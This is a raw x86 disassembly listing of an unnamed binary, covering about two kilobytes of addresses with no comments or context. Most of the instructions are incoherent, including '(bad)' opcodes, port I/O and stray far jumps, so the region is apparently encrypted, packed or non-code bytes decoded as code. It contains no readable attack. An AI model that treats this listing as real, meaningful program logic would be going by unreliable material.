  405812:	and    al,BYTE PTR [ecx-0x1515bb6b]
  405818:	adc    eax,0xe2b95f39
  40581d:	lds    esp,FWORD PTR ds:[ecx]
  405820:	lods   al,BYTE PTR ds:[esi]
  405821:	pop    ss
  405822:	in     eax,dx
  405823:	sub    ch,dh
  405825:	xchg   esi,eax
  405826:	fdivrp st(4),st
  405828:	mov    edx,0xbe0e2c7c
  40582d:	ins    BYTE PTR es:[edi],dx
  40582e:	outs   dx,DWORD PTR ds:[esi]
  40582f:	dec    ecx
  405830:	pop    edx
  405831:	cdq    
  405832:	push   0xe2e2db53
  405837:	push   0x9
  405839:	xchg   edi,eax
  40583a:	pop    ds
  40583b:	jo     0x40581f
  40583d:	retf   0xd125
  405840:	pop    edi
  405841:	or     eax,DWORD PTR ds:0x88bd1c86
  405847:	(bad)  
  405848:	enter  0x4110,0x29
  40584c:	aas    
  40584d:	rcl    BYTE PTR ds:0x41cf1bd5,cl
  405853:	cwde   
  405854:	ror    eax,0xdb
  405857:	fsub   DWORD PTR [ecx-0x28]
  40585a:	stos   DWORD PTR es:[edi],eax
  40585b:	out    dx,al
  40585c:	aas    
  40585d:	pop    ds
  40585e:	push   ss
  40585f:	inc    eax
  405860:	sub    edi,0xdce1a183
  405866:	test   DWORD PTR [edi+0x6b],ecx
  405869:	mov    bh,0xcb
  40586b:	ja     0x4057f5
  40586d:	adc    al,0xce
  40586f:	retf   
  405870:	data16 test BYTE PTR [eax],0xb8
  405874:	push   ebp
  405875:	(bad)  
  405876:	mov    ah,0x6c
  405878:	xchg   ebp,eax
  405879:	sbb    ch,BYTE PTR [esi]
  40587b:	cmp    DWORD PTR [ecx-0x78],ecx
  40587e:	jnp    0x40589c
  405880:	ror    esi,1
  405882:	adc    BYTE PTR [edi+0x71],dh
  405885:	loopne 0x4058d5
  405887:	lods   al,BYTE PTR ds:[esi]
  405888:	mov    al,ds:0x710cda37
  40588d:	nop
  40588e:	mov    cl,0x33
  405890:	mov    esi,0x292f7f4f
  405895:	out    dx,al
  405896:	add    eax,0xe344e583
  40589b:	cld    
  40589c:	js     0x405850
  40589e:	sar    DWORD PTR [eax],0x49
  4058a1:	in     al,dx
  4058a2:	pusha  
  4058a3:	pop    ss
  4058a4:	mov    bl,0x7a
  4058a6:	cmp    al,0xb5
  4058a9:	mov    al,ds:0x49a110ef
  4058ae:	outs   dx,DWORD PTR ds:[esi]
  4058af:	push   es
  4058b0:	jp     0x4058aa
  4058b2:	pop    ecx
  4058b3:	cwde   
  4058b4:	clc    
  4058b5:	jg     0x405847
  4058b7:	popa   
  4058b8:	cmp    cl,dl
  4058ba:	ins    DWORD PTR es:[edi],dx
  4058bb:	fstp   TBYTE PTR [edi+esi*1+0x6fa9a94c]
  4058c2:	ins    BYTE PTR es:[edi],dx
  4058c3:	push   ebp
  4058c4:	pop    ebx
  4058c5:	jo     0x405862
  4058c7:	pusha  
  4058c8:	push   cs
  4058c9:	adc    DWORD PTR [ecx],esp
  4058cb:	inc    ebx
  4058cc:	test   BYTE PTR [ecx],ch
  4058ce:	out    dx,eax
  4058cf:	xchg   edx,eax
  4058d0:	adc    esi,DWORD PTR [ecx]
  4058d2:	sub    edx,DWORD PTR [edi-0x3b]
  4058d5:	ins    BYTE PTR es:[edi],dx
  4058d6:	dec    esp
  4058d7:	jle    0x405947
  4058d9:	add    al,0xf6
  4058db:	xchg   BYTE PTR [esi-0x32],dl
  4058de:	nop
  4058df:	mov    ds:0x279e5e11,eax
  4058e4:	mov    ecx,0x19173fc
  4058e9:	mov    BYTE PTR [esi+eiz*8],bl
  4058ec:	push   eax
  4058ed:	int    0x62
  4058ef:	fadd   DWORD PTR [esi+0x2ad4b9d2]
  4058f5:	call   0x7a37:0x44144e26
  4058fc:	test   al,0x31
  4058fe:	cdq    
  4058ff:	sbb    BYTE PTR [edx+0x6a],dl
  405902:	inc    ebx
  405903:	or     al,0xa0
  405905:	cmc    
  405906:	adc    eax,0xaee5b8be
  40590b:	and    dh,bl
  40590d:	arpl   WORD PTR [edx-0x28],bx
  405910:	ins    BYTE PTR es:[edi],dx
  405911:	outs   dx,BYTE PTR ds:[esi]
  405912:	and    al,0x6a
  405914:	or     eax,ebx
  405916:	shr    dh,1
  405918:	out    0x4d,eax
  40591a:	mov    ebp,0x52cb943d
  40591f:	ret    0x1488
  405922:	in     eax,dx
  405923:	xchg   esp,eax
  405924:	jmp    0x6a57:0x32c7743
  40592b:	outs   dx,DWORD PTR ds:[esi]
  40592c:	pop    edi
  40592d:	sbb    bl,BYTE PTR [edi]
  40592f:	push   ebp
  405930:	std    
  405931:	mov    al,0xd4
  405933:	add    cl,BYTE PTR [esi]
  405935:	xchg   esp,eax
  405936:	loopne 0x405976
  405938:	imul   esp,DWORD PTR [edi-0x6bff3193],0xffffff83
  40593f:	cmc    
  405940:	lods   eax,DWORD PTR ds:[esi]
  405941:	push   0x5e
  405943:	bnd ret 
  405945:	test   DWORD PTR [edx+0x103f9dc5],edi
  40594b:	cwde   
  40594c:	test   DWORD PTR [ebp-0x50],edx
  40594f:	xchg   esi,eax
  405950:	add    al,0x8c
  405952:	lods   al,BYTE PTR ds:[esi]
  405953:	scas   al,BYTE PTR es:[edi]
  405954:	or     eax,0xa3665151
  405959:	js     0x40598b
  40595b:	mov    ds:0x3e34726d,eax
  405960:	dec    edi
  405961:	retf   
  405962:	mov    edi,0x5dfa5827
  405967:	stc    
  405968:	(bad)  
  405969:	sub    esi,DWORD PTR [esp+eax*8+0x5d5d041]
  405970:	push   ds
  405971:	or     BYTE PTR [ebp-0x5522b123],ah
  405977:	sar    DWORD PTR [eax],0x3b
  40597a:	es faddp st(7),st
  40597d:	cmp    DWORD PTR [edi+0x4],esp
  405980:	mov    edx,0x6dbbef66
  405986:	aas    
  405987:	xor    DWORD PTR [eax],edi
  405989:	mov    edi,0x7053136e
  40598e:	add    eax,0xbcf44c41
  405993:	je     0x4059da
  405995:	(bad)  
  405996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405997:	nop
  405998:	ins    BYTE PTR es:[edi],dx
  405999:	icebp  
  40599a:	(bad)
  40599d:	xchg   ebp,eax
  40599e:	repnz loope 0x405945
  4059a1:	add    BYTE PTR [eax],bh
  4059a3:	or     al,0x73
  4059a5:	sar    edx,1
  4059a7:	cmp    ebp,esi
  4059a9:	add    eax,0xff9c5a78
  4059ae:	sub    esi,DWORD PTR [edx]
  4059b0:	sub    esp,DWORD PTR [ebx+0x29c4755a]
  4059b6:	mov    bl,0xd6
  4059b8:	in     eax,dx
  4059b9:	nop
  4059ba:	nop
  4059bb:	clc    
  4059bc:	das    
  4059bd:	stos   DWORD PTR es:[edi],eax
  4059be:	lahf   
  4059bf:	add    ebp,DWORD PTR [edx-0x394d998b]
  4059c5:	test   al,0x85
  4059c7:	mov    ebx,0x5c26b6dc
  4059cc:	and    cl,BYTE PTR [ebx+edx*2]
  4059cf:	cmc    
  4059d0:	or     eax,0xe851643a
  4059d5:	push   edx
  4059d6:	xchg   ebp,eax
  4059d7:	xchg   ebx,eax
  4059d8:	ror    DWORD PTR [ebx+eax*8-0x1a14605d],cl
  4059df:	xor    eax,0xe803edcc
  4059e4:	es or  al,0x88
  4059e7:	stc    
  4059e8:	mov    cs:0xcd9cad90,eax
  4059ee:	pop    ss
  4059ef:	(bad)  
  4059f0:	mov    eax,0x3b107503
  4059f5:	(bad)  
  4059f6:	jbe    0x4050e3
  4059fc:	pop    ebx
  4059fd:	mov    eax,0xf89c8539
  405a02:	pop    edi
  405a03:	pop    esi
  405a04:	leave  
  405a05:	ret    0xc
  405a08:	push   ebp
  405a09:	mov    ebp,esp
  405a0b:	mov    eax,DWORD PTR [ebp+0xc]
  405a0e:	jmp    0x405cfe
  405a13:	cmp    eax,0xd4d7d0c1
  405a18:	fnstcw WORD PTR ds:0xbbc9f8d9
  405a1e:	jecxz  0x4059f1
  405a20:	test   DWORD PTR [ebp+0x2b],ebx
  405a23:	cmp    BYTE PTR [bx+si+0x78],bh
  405a27:	dec    ebp
  405a28:	jle    0x405aa2
  405a2a:	js     0x405a57
  405a2c:	push   cs
  405a2d:	xchg   edi,eax
  405a2e:	aam    0x37
  405a30:	adc    eax,0xba82fe51
  405a35:	pusha  
  405a36:	or     edi,DWORD PTR [ecx+0x756c2c93]
  405a3c:	adc    ah,BYTE PTR [eax+edi*1-0x20]
  405a40:	in     eax,dx
  405a41:	dec    esi
  405a42:	pop    ecx
  405a43:	ja     0x405a5e
  405a45:	dec    esi
  405a46:	or     BYTE PTR [edx*4+0x14c0e3b3],al
  405a4d:	in     eax,dx
  405a4e:	sbb    DWORD PTR [ebx-0x14],edi
  405a51:	xchg   BYTE PTR [ebp+0x206f7d1e],ch
  405a57:	dec    ebx
  405a58:	dec    ecx
  405a59:	push   eax
  405a5a:	mov    cl,BYTE PTR [eax]
  405a5c:	shl    DWORD PTR [edi],1
  405a5e:	loop   0x4059eb
  405a60:	ror    DWORD PTR [edx],0x86
  405a63:	iret   
  405a64:	cmp    esi,ebp
  405a66:	(bad)  
  405a67:	xchg   ebp,eax
  405a68:	pop    esi
  405a69:	inc    eax
  405a6a:	jge    0x405a7d
  405a6c:	jp     0x405a3b
  405a6e:	leave  
  405a6f:	(bad)  
  405a70:	gs pusha 
  405a72:	retf   
  405a73:	out    0x8c,eax
  405a75:	outs   dx,DWORD PTR ds:[esi]
  405a76:	xor    ecx,esi
  405a78:	cmp    dl,BYTE PTR [edi+0x5142797]
  405a7e:	cmp    edx,edi
  405a80:	sub    eax,0x63413e62
  405a85:	or     BYTE PTR [ecx+ebx*2+0x48],bh
  405a89:	mov    al,0xb3
  405a8b:	cmovle eax,DWORD PTR [ebp+0x69]
  405a8f:	or     eax,esi
  405a91:	aad    0x16
  405a93:	in     al,dx
  405a94:	fmul   DWORD PTR [ecx-0x4]
  405a97:	bound  ebp,QWORD PTR [eax+0x7bcae5cb]
  405a9d:	js     0x405a45
  405a9f:	fdiv   DWORD PTR [edi+0x6a90c3bb]
  405aa5:	and    BYTE PTR [esp+ebp*4-0x7d],0x5c
  405aaa:	adc    ch,BYTE PTR [ebx-0x430f1afe]
  405ab0:	cwde   
  405ab1:	mov    esp,0x52d0cfa3
  405ab6:	fst    DWORD PTR [esp+ecx*2-0x5b]
  405aba:	pop    ebp
  405abb:	xchg   BYTE PTR [edx-0x1],bh
  405abe:	fsubr  QWORD PTR [edi-0x46137bbe]
  405ac4:	std    
  405ac5:	sub    bl,BYTE PTR [edx-0xe7e7bcc]
  405acb:	jb     0x405b42
  405acd:	cwde   
  405ace:	xchg   esi,eax
  405acf:	push   edx
  405ad0:	pusha  
  405ad1:	in     al,dx
  405ad2:	add    bl,ah
  405ad4:	enter  0x7a36,0xe4
  405ad8:	adc    BYTE PTR [ebx-0x652e8acf],dl
  405ade:	and    edx,ecx
  405ae0:	xchg   edx,eax
  405ae1:	add    bl,BYTE PTR ds:[ecx+0x72]
  405ae5:	stc    
  405ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ae7:	retf   0xe71e
  405aea:	mov    dh,0x4b
  405aec:	repz add dl,bl
  405aef:	dec    edi
  405af0:	pop    edi
  405af1:	inc    esp
  405af2:	scas   eax,DWORD PTR es:[edi]
  405af3:	jmp    0x405aa9
  405af5:	xor    al,0x70
  405af7:	push   ds
  405af8:	pop    ds
  405af9:	outs   dx,BYTE PTR ds:[esi]
  405afa:	inc    ecx
  405afb:	fcomp  DWORD PTR [eax-0x70]
  405afe:	bswap  edx
  405b00:	stos   BYTE PTR es:[edi],al
  405b01:	std    
  405b02:	and    al,0xd7
  405b04:	clc    
  405b05:	sbb    eax,0xf18ee869
  405b0a:	popa   
  405b0b:	inc    ebx
  405b0c:	mov    edi,0x9f12ea96
  405b11:	sbb    DWORD PTR [edx],esi
  405b13:	mov    ds,WORD PTR [esi-0x58]
  405b16:	in     eax,0x93
  405b18:	pop    ebp
  405b19:	stos   DWORD PTR es:[edi],eax
  405b1a:	lods   al,BYTE PTR ds:[esi]
  405b1b:	xlat   BYTE PTR ds:[ebx]
  405b1c:	sbb    cl,dl
  405b1e:	stc    
  405b1f:	inc    esi
  405b20:	mov    esi,0x30868aa9
  405b25:	(bad)  
  405b26:	imul   BYTE PTR [edx]
  405b28:	arpl   WORD PTR [ebp+0x5d],bx
  405b2b:	jne    0x405ad4
  405b2d:	retf   
  405b2e:	repnz push ecx
  405b30:	or     eax,DWORD PTR [ecx-0x292b9454]
  405b36:	inc    ebx
  405b37:	mul    BYTE PTR [ecx+eax*2+0x17]
  405b3b:	or     al,0x4
  405b3d:	jne    0x63e8628
  405b43:	fmul   DWORD PTR gs:[ecx+0x20]
  405b47:	ins    BYTE PTR es:[edi],dx
  405b48:	mov    DWORD PTR [eax+0xfc40eeb],ecx
  405b4e:	push   ebx
  405b4f:	mov    ds:0xfda9aa88,al
  405b54:	push   ebp
  405b55:	mov    DWORD PTR [ebx-0x52],ecx
  405b58:	and    DWORD PTR [ebx+0x1b],ebx
  405b5b:	jns    0x405b4e
  405b5d:	mov    ebp,0xb7e371da
  405b62:	stos   BYTE PTR es:[edi],al
  405b63:	push   ecx
  405b64:	xor    DWORD PTR [edx+0x4704df2],ebx
  405b6a:	sahf   
  405b6b:	adc    al,0xb1
  405b6d:	gs pop esp
  405b6f:	mov    WORD PTR [ebx],?
  405b71:	xor    eax,0x91ddd11d
  405b76:	xchg   ebx,eax
  405b77:	ror    BYTE PTR [ecx-0x43df7fee],cl
  405b7d:	sbb    dl,bh
  405b7f:	and    BYTE PTR [esi],ch
  405b81:	stos   BYTE PTR es:[edi],al
  405b82:	fnstenv [ebx+0x38]
  405b85:	fs jl  0x405b1d
  405b88:	xor    BYTE PTR ds:0xfed3205a,0x71
  405b8f:	mov    bl,0x82
  405b91:	ret    0xbf38
  405b94:	popa   
  405b95:	push   0x3a
  405b97:	mov    BYTE PTR [edi+eax*4],bh
  405b9a:	sbb    DWORD PTR [ebp+0x4c18fcad],ecx
  405ba0:	retf   
  405ba1:	test   BYTE PTR [esi-0x2437bd7a],ch
  405ba7:	js     0x405bcb
  405ba9:	cmc    
  405baa:	mov    al,0xa5
  405bac:	or     eax,edi
  405bae:	and    al,0x8d
  405bb0:	or     al,0x43
  405bb2:	pop    ebp
  405bb3:	rcpps  xmm6,XMMWORD PTR ds:0x2f4f459c
  405bba:	cdq    
  405bbb:	mov    esp,0x9002aadc
  405bc0:	push   0x74d37aba
  405bc5:	cdq    
  405bc6:	enter  0xce3,0x35
  405bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bcb:	ret    0xfbca
  405bce:	dec    esi
  405bcf:	cmp    BYTE PTR [edi-0x111ebbd3],cl
  405bd5:	pop    ebp
  405bd6:	xchg   ch,dl
  405bd8:	mov    bl,0x3f
  405bda:	push   ecx
  405bdb:	xchg   ch,ch
  405bdd:	push   edx
  405bde:	mov    edi,0xc4648ab8
  405be3:	mov    ecx,0x7c80ba99
  405be8:	sub    ah,BYTE PTR [edi-0x27774169]
  405bee:	pop    ds
  405bef:	hlt    
  405bf0:	and    BYTE PTR [edx-0x2f],0x36
  405bf4:	adc    ebx,DWORD PTR ds:[edi-0x44517b63]
  405bfb:	mov    edi,0x3b7b85dc
  405c00:	(bad)  
  405c03:	push   esi
  405c04:	xor    BYTE PTR [esi],ch
  405c06:	dec    ebp
  405c07:	jecxz  0x405bca
  405c09:	loop   0x405c80
  405c0b:	adc    BYTE PTR [edi-0x67b748fd],ch
  405c11:	adc    BYTE PTR [ecx+0x635e5079],dl
  405c17:	inc    ecx
  405c18:	test   esi,esi
  405c1a:	mov    eax,0xd3461b23
  405c1f:	pop    ebp
  405c20:	jb     0x405bd6
  405c22:	mov    ch,0xa1
  405c24:	and    DWORD PTR [eax-0x6a5453ce],ebp
  405c2a:	loope  0x405ca8
  405c2c:	push   edx
  405c2d:	lods   al,BYTE PTR ds:[esi]
  405c2e:	es inc edi
  405c30:	mov    esp,0xd9c40ac0
  405c35:	call   0xac8dbe40
  405c3a:	jp     0x405bf4
  405c3c:	push   esi
  405c3d:	and    esi,esp
  405c3f:	mov    bl,0xc1
  405c41:	pop    ebx
  405c42:	test   DWORD PTR [ecx-0x2e],0x214ac9c7
  405c49:	dec    ebp
  405c4a:	sbb    eax,0x703a82ce
  405c4f:	frstor [edi+0x2d]
  405c52:	js     0x405be4
  405c54:	jb     0x405bdf
  405c56:	mov    bh,0x23
  405c58:	in     eax,dx
  405c59:	rcr    bl,0x85
  405c5c:	mov    al,ds:0x571fa93a
  405c61:	jp     0x405c33
  405c63:	aas    
  405c64:	aas    
  405c65:	adc    ecx,ecx
  405c67:	ffreep st(7)
  405c69:	inc    eax
  405c6a:	retf   0xd4
  405c6d:	jge    0x405c15
  405c6f:	cli    
  405c70:	jbe    0x405c0b
  405c72:	cwde   
  405c73:	mov    ds:0xa9316b3b,al
  405c78:	jae    0x405ca5
  405c7a:	push   0x42
  405c7c:	imul   edx,ebx,0x38
  405c7f:	fdivr  DWORD PTR [ebp+0x1ba6507b]
  405c85:	hlt    
  405c86:	or     al,0xd4
  405c88:	adc    DWORD PTR [eax+0x33],ebp
  405c8b:	mov    eax,DWORD PTR [edi]
  405c8d:	repnz pop ecx
  405c8f:	push   cs
  405c90:	add    al,BYTE PTR [ebx+0x711c6b6b]
  405c96:	adc    eax,0x3a8d0e67
  405c9b:	lods   eax,DWORD PTR ds:[esi]
  405c9c:	das    
  405c9d:	out    dx,al
  405c9e:	loop   0x405cb0
  405ca0:	div    DWORD PTR [edx]
  405ca2:	jo     0x405d15
  405ca4:	es jb  0x405d0b
  405ca7:	(bad)  
  405ca8:	(bad)
  405cac:	xchg   bl,ch
  405cae:	inc    esi
  405caf:	das    
  405cb0:	jb     0x405d26
  405cb2:	rcr    BYTE PTR [eax],0x15
  405cb5:	rcl    DWORD PTR ds:0x7b1c0478,cl
  405cbb:	dec    ebp
  405cbc:	adc    dl,BYTE PTR [ebp+0x5869c3df]
  405cc2:	jp     0x405cec
  405cc4:	pushf  
  405cc5:	adc    al,0xc3
  405cc7:	test   al,0x66
  405cc9:	and    ax,0xc8b2
  405ccd:	mov    ecx,0xbdaa7141
  405cd2:	cmc    
  405cd3:	pop    ds
  405cd4:	adc    bh,dl
  405cd6:	sub    DWORD PTR [bp+si+0x6d1a],esi
  405cdb:	imul   esi,DWORD PTR [eax+0x52a9dee4],0xedea93cd
  405ce5:	xchg   ecx,eax
  405ce6:	ret    
  405ce7:	dec    ebp
  405ce8:	mov    dl,0xab
  405cea:	dec    esp
  405ceb:	in     al,dx
  405cec:	rol    BYTE PTR [ecx+eax*8+0x60],cl
  405cf0:	(bad)  
  405cf2:	fidiv  DWORD PTR [ecx-0x28]
  405cf5:	jo     0x405c9e
  405cf7:	out    dx,eax
  405cf8:	pusha  
  405cf9:	shr    BYTE PTR [eax+0x33149815],0xd2
  405d00:	jmp    0x405ff0
  405d05:	rol    ebx,1
  405d07:	ror    cl,0xd6
  405d0a:	leave  
  405d0b:	rcr    ebx,1
  405d0d:	aaa    
  405d0e:	mov    eax,0xd3494c09
  405d13:	mov    edi,0x783db447
  405d18:	js     0x405d67
  405d1a:	jle    0x405d94
  405d1c:	js     0x405d03
  405d1e:	xchg   edi,eax
  405d1f:	mov    ebp,0xf69ac275
  405d24:	ins    DWORD PTR es:[edi],dx
  405d25:	adc    esi,DWORD PTR [edi]
  405d27:	sbb    bl,dh
  405d29:	lods   eax,DWORD PTR fs:[esi]
  405d2b:	rcr    DWORD PTR [ebx],0xd2
  405d2e:	or     DWORD PTR [ebp+0x708fc687],ecx
  405d34:	and    ebx,DWORD PTR [ebx-0x3861c305]
  405d3a:	mov    ebx,0x4f1ef1f2
  405d3f:	fadd   QWORD PTR [edi]
  405d41:	mov    DWORD PTR [eax-0x4ffb15d7],ebp
  405d47:	mov    BYTE PTR [eax],dh
  405d49:	xor    eax,0x7b629ba9
  405d4e:	pop    esi
  405d4f:	outs   dx,DWORD PTR ds:[esi]
  405d50:	and    BYTE PTR [ebp-0x56],bl
  405d53:	ss push esi
  405d55:	add    ebx,DWORD PTR [edx]
  405d57:	out    0xcf,eax
  405d59:	ret    0x4adb
  405d5c:	cmp    ch,0x6c
  405d5f:	sbb    al,0x38
  405d61:	popf   
  405d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d63:	daa    
  405d64:	mov    eax,ds:0xddf1293a
  405d69:	dec    edx
  405d6a:	cmp    al,0x89
  405d6c:	int3   
  405d6d:	scas   eax,DWORD PTR es:[edi]
  405d6e:	and    al,al
  405d70:	push   cs
  405d71:	push   ebx
  405d72:	cdq    
  405d73:	ret    0x4ad9
  405d76:	retf   
  405d77:	sub    eax,0xfe524e28
  405d7c:	hlt    
  405d7d:	arpl   sp,bx
  405d7f:	xchg   ebx,eax
  405d80:	mov    ebx,?
  405d82:	icebp  
  405d83:	ret    
  405d84:	lea    esp,[edi]
  405d86:	push   edi
  405d87:	and    esp,0xed74578f
  405d8d:	pop    edi
  405d8e:	push   edx
  405d8f:	mov    al,ds:0xc04344a8
  405d94:	mov    eax,ds:0xee491171
  405d99:	xchg   edi,eax
  405d9a:	shl    BYTE PTR [ebx],0x64
  405d9d:	lods   eax,DWORD PTR ds:[esi]
  405d9e:	xchg   ecx,eax
  405d9f:	push   cs
  405da0:	rcr    DWORD PTR [ebp+0x57bacdf0],cl
  405da6:	xchg   ebp,eax
  405da7:	jmp    0x568d:0x275c955
  405dae:	and    BYTE PTR [edx],bh
  405db0:	out    0x93,al
  405db2:	into   
  405db3:	out    dx,eax
  405db4:	stos   DWORD PTR es:[edi],eax
  405db5:	mov    bl,0xcb
  405db7:	add    al,0xd7
  405db9:	sbb    dl,BYTE PTR [ecx+esi*1-0x66]
  405dbd:	mov    edx,0x2a7b3877
  405dc2:	sub    BYTE PTR [edx+0x60],bl
  405dc5:	in     al,0xe8
  405dc7:	int    0x52
  405dc9:	xchg   ebx,eax
  405dca:	sub    al,0x7b
  405dcc:	push   ss
  405dcd:	pop    edi
  405dce:	add    DWORD PTR [ebx],ebx
  405dd0:	pop    es
  405dd1:	sbb    edx,DWORD PTR [edx]
  405dd3:	into   
  405dd4:	add    bl,BYTE PTR [ecx-0x19]
  405dd7:	or     cl,cl
  405dd9:	in     al,dx
  405dda:	fnsave [ecx]
  405ddc:	bound  ecx,QWORD PTR [ebx+ebp*2]
  405ddf:	dec    ebp
  405de0:	add    BYTE PTR [esi-0x24],0x70
  405de4:	cmp    bl,al
  405de6:	scas   eax,DWORD PTR es:[edi]
  405de7:	jne    0x405e5c
  405de9:	xchg   edx,eax
  405dea:	jp     0x405e27
  405dec:	scas   al,BYTE PTR es:[edi]
  405ded:	out    0xb4,eax
  405def:	cmp    BYTE PTR [ebp+0x2aa8c2ab],0x45
  405df6:	aaa    
  405df7:	xchg   ebx,eax
  405df8:	xor    bh,BYTE PTR [eax+0x2e70ee05]
  405dfe:	mov    ah,0x1d
  405e00:	mov    eax,0x511adaa
  405e05:	push   esp
  405e06:	jg     0x405e0f
  405e08:	push   edx
  405e09:	sbb    DWORD PTR [edx-0x31],ecx
  405e0c:	xchg   edx,eax
  405e0d:	out    dx,eax
  405e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e0f:	add    esi,eax
  405e11:	loop   0x405dc7
  405e13:	in     eax,dx
  405e14:	mov    bl,0x83
  405e16:	jg     0x405e3e
  405e18:	pusha  
  405e19:	jne    0x405de5
  405e1b:	out    0x1d,eax
  405e1d:	mov    bh,dh
  405e1f:	imul   eax,eax
  405e22:	add    eax,0xbe7daf81
  405e27:	das    
  405e28:	outs   dx,BYTE PTR ds:[esi]
  405e29:	sbb    eax,0x4b206bb2
  405e2e:	cmp    eax,0x414b6bd0
  405e33:	sub    edx,eax
  405e35:	sub    BYTE PTR [esi+esi*4-0x3c],bh
  405e39:	data16 and dl,BYTE PTR [edx-0x5d364d3b]
  405e40:	fcomp  DWORD PTR [ebx]
  405e42:	cld    
  405e43:	jne    0x405e5e
  405e45:	jb     0x405e65
  405e47:	div    BYTE PTR [edx-0x2e5f58b1]
  405e4d:	cld    
  405e4e:	dec    ecx
  405e4f:	sti    
  405e50:	pop    ebx
  405e51:	xlat   BYTE PTR ds:[ebx]
  405e52:	aam    0x34
  405e54:	jae    0x405e75
  405e56:	add    eax,0x49325f6d
  405e5b:	jl     0x405ead
  405e5d:	sbb    ch,BYTE PTR [edx-0x59]
  405e60:	repz fmul QWORD PTR [bp+si]
  405e64:	je     0x405eb1
  405e66:	pop    ebp
  405e67:	inc    edx
  405e68:	xor    DWORD PTR [eax-0x775a0adf],ebp
  405e6e:	imul   esp,DWORD PTR [eax+0x3e],0xffffffe5
  405e72:	lods   eax,DWORD PTR ds:[esi]
  405e73:	ficom  DWORD PTR [eax]
  405e75:	or     DWORD PTR [eax-0x16],ebx
  405e78:	mov    eax,ds:0x6223ff09
  405e7d:	or     ecx,DWORD PTR [edi+ebp*8-0x2d5010b9]
  405e84:	daa    
  405e85:	xchg   esp,eax
  405e86:	add    eax,0x98bb4003
  405e8b:	push   ebx
  405e8c:	mov    BYTE PTR [eax],dl
  405e8e:	ret    
  405e8f:	jg     0x405e1d
  405e91:	mov    al,0x68
  405e93:	arpl   di,si
  405e95:	jnp    0x405e2f
  405e97:	xchg   esp,eax
  405e98:	sti    
  405e99:	push   edi
  405e9a:	and    BYTE PTR [ecx+0x7c],al
  405e9d:	inc    eax
  405e9e:	mov    ecx,esp
  405ea0:	test   esp,0xb7362574
  405ea6:	lea    ebp,[ebx-0x1]
  405ea9:	adc    ecx,DWORD PTR [edi+0x5]
  405eac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ead:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eae:	mov    al,0x35
  405eb0:	mov    al,0xf5
  405eb2:	test   eax,0xd292f16f
  405eb7:	or     esp,DWORD PTR [edx+0x2f6fa38]
  405ebd:	ror    eax,1
  405ebf:	xor    BYTE PTR [eax],ah
  405ec1:	sbb    eax,0xafe9fb8
  405ec6:	mov    ds,WORD PTR [edx]
  405ec8:	out    dx,eax
  405ec9:	xchg   esi,ebx
  405ecb:	mov    esp,0x31a3ca9e
  405ed0:	cs ret 0x72a5
  405ed4:	and    ch,bh
  405ed6:	js     0x405ed0
  405ed8:	test   al,0x7a
  405eda:	pop    ebx
  405edb:	aas    
  405edc:	int    0x5b
  405ede:	daa    
  405edf:	leave  
  405ee0:	bound  edx,QWORD PTR [edi+0x5409a746]
  405ee6:	nop
  405ee7:	mov    dl,0x9f
  405ee9:	sar    BYTE PTR [edi-0x14b8eed7],cl
  405eef:	gs popf 
  405ef1:	xchg   esi,eax
  405ef2:	inc    edx
  405ef3:	sahf   
  405ef4:	adc    al,0x36
  405ef6:	xor    ecx,DWORD PTR [edx+0x1a0b1c90]
  405efc:	pop    esp
  405efd:	add    al,0x84
  405eff:	xor    eax,DWORD PTR [ecx+0x37]
  405f02:	jmp    0x5d6e:0xf86d4916
  405f09:	mov    ch,0x67
  405f0b:	aaa    
  405f0c:	cld    
  405f0d:	jp     0x405f7d
  405f0f:	push   edx
  405f10:	in     al,dx
  405f11:	xor    al,0x6e
  405f13:	aad    0x63
  405f15:	jmp    0x39b1:0x65706767
  405f1c:	inc    esi
  405f1d:	ds popf 
  405f1f:	sti    
  405f20:	arpl   WORD PTR [edi+0x45af5d06],di
  405f26:	in     eax,0xb1
  405f28:	imul   edx,DWORD PTR [ebp-0x67a1a153],0xc92986b1
  405f32:	fdivr  DWORD PTR [eax-0x473ef477]
  405f38:	and    al,0x8e
  405f3a:	xor    ecx,DWORD PTR [esp+edi*8+0x76424243]
  405f41:	pop    ss
  405f42:	sub    al,0x18
  405f44:	test   DWORD PTR [eax-0xf],edi
  405f47:	aaa    
  405f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f49:	mov    dl,0xe
  405f4b:	icebp  
  405f4c:	fild   DWORD PTR [edi]
  405f4e:	js     0x405fc9
  405f50:	fxtract 
  405f52:	jo     0x405f66
  405f54:	cmp    dh,BYTE PTR [edx]
  405f56:	add    ecx,DWORD PTR [edx]
  405f58:	cmp    BYTE PTR [ecx-0x6b43d5a2],ch
  405f5e:	ror    BYTE PTR [ecx-0x4d],0xcb
  405f62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f63:	cld    
  405f64:	adc    edi,DWORD PTR ds:0xcd8123d4
  405f6a:	test   BYTE PTR [edx],0xf6
  405f6d:	ret    
  405f6e:	scas   eax,DWORD PTR es:[edi]
  405f6f:	xor    ch,dl
  405f71:	stos   BYTE PTR es:[edi],al
  405f72:	ret    0xded3
  405f75:	popa   
  405f76:	sahf   
  405f77:	dec    edi
  405f78:	xchg   ebp,eax
  405f79:	sbb    al,0x7f
  405f7b:	dec    esp
  405f7c:	rcl    DWORD PTR [ebp+0x1e02ef74],cl
  405f82:	push   ss
  405f83:	out    0xf7,al
  405f85:	push   ss
  405f86:	int    0x94
  405f88:	sbb    ebp,edi
  405f8a:	mov    dh,0x84
  405f8c:	mov    bl,0x92
  405f8e:	loop   0x405f2e
  405f90:	xor    DWORD PTR [eax+0x5c],ecx
  405f93:	sti    
  405f94:	sub    DWORD PTR [eax],0x7aeb1663
  405f9a:	outs   dx,BYTE PTR ds:[esi]
  405f9b:	sub    eax,DWORD PTR [edx+0x19361e0f]
  405fa1:	xchg   edx,eax
  405fa2:	fimul  WORD PTR [ecx-0x7006e1b3]
  405fa8:	sbb    bh,BYTE PTR [ebx-0x5413c5f6]
  405fae:	adc    BYTE PTR [ebp-0x3811655d],bl
  405fb4:	aas    
  405fb5:	mov    eax,0x5b279f62
